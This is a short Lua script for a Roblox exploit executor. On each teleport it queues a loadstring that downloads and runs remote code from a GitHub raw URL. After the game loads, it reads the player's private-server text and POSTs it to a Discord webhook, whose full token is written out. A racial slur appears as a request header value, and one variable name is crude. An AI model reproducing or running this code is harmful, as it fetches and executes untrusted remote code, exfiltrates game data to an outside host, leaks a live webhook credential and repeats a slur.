game.Players.LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        (syn and syn.queue_on_teleport or queue_on_teleport)("loadstring(game:HttpGet('https://raw.githubusercontent.com/ForcedProject/FARAIZUUUU/main/SPPPPII.lua'))()")
    end
end)

if game:IsLoaded() then
    wait(30)
    local jefaoui = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
local cock = game.Players.LocalPlayer.PlayerGui:WaitForChild('Main').private.Text
local Response = syn.request({
        Url = 'https://discord.com/api/webhooks/935303027181649992/Tw055ZwR4Y0whxUdV1GoaBgcB3h2ixumdekr2yJ9SdvxPxDuzN4zLAcwXlhdS7yPKMA-',
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ['title'] = "NIGZ"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = "New private server! "..game.Players.LocalPlayer.PlayerGui.Main.private.Text})
    })
end
